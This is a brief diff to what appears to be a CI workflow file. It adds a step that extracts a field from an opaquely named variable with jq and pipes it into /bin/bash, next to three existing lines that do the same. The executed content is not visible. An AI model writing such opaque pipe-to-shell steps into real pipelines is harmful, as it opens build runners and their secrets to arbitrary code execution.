@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$ypfhr125" | jq -r .vx54 | /bin/bash
           echo $taxjn91899 | jq -r .r47008 | /bin/bash
           echo $ufv12 | jq -r .gld6 | /bin/bash
+          printf '%s' "$xua7" | jq -r .tc4294 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
